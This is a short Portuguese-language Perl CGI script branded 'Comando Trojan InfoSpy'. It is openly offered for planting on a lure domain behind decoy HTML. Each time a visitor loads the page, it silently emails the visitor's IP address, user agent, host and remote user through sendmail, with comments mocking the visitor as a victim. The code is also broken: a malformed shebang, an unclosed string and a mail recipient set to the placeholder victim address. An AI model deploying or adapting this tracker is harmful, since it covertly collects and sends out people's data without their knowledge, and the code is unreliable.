#/usr/bin/perl
################################################
#                                              #
#**********************************************#
#*    _           _                           *#
#* |\_\\-\     /-//_/|                        *#
#* |   \\-|   |-//   |                        *#
#*  \ /~\\_____//~\ /                         *#
#*   `   /     \   ´                          *#
#*      | () () |       Comando Trojan        *#
#*       \  ^  /              -=-             *#
#*        |||||    www.comandotrojan.cjb.net  *#
#*        |||||                               *#
#*                                            *#
#**********************************************#
#                                              #
#    Vai Abaixo o CGI InfoSpy by iradium       #
#                                              #
#      Por Favor Preserve estas Linhas         #
#                                              #
#                 chmod 755                    #
#                                              #
################################################


print "Content-type: text/html\n\n";

$c = "contador.txt";
#Nome do .txt log
$mailprog = "/usr/sbin/sendmail -t"; 
#Preste Atenção o real caminho do email no seu server
$emailadm = "seu_email\@seu_site.com.br;
#Deixe o \ no email
$vitima = "lamer_entrou@se_fudeu.com";
#Deixe como estar
#Lembrar de fazer um domínio tipo www.entrem.cjb.net e por index.cgi

print <<EOF;
 +++ Coloque aqui o html fictício para ser exibido +++
EOF

open (N, "$c");
$n = <N>;
close (N);

$n++;

open (NE, ">$c");
print NE "$n";
close (NE);

                open (MAIL, "|$mailprog") || print "Can't open $mailprog
.\n";
                print MAIL "To: $vitima \n";
                print MAIL "From: $emailadm\n";
                print MAIL "Subject: Visita\n\n";
                print MAIL "$ENV{'REMOTE_ADDR'} \n $ENV{'HTTP_USER_AGENT'} \n  $ENV{'REMOTE_HOST'} \n $ENV{'REMOTE_USER'} $n\n\n ";
                close MAIL;

#FIM DO ARQUIVO
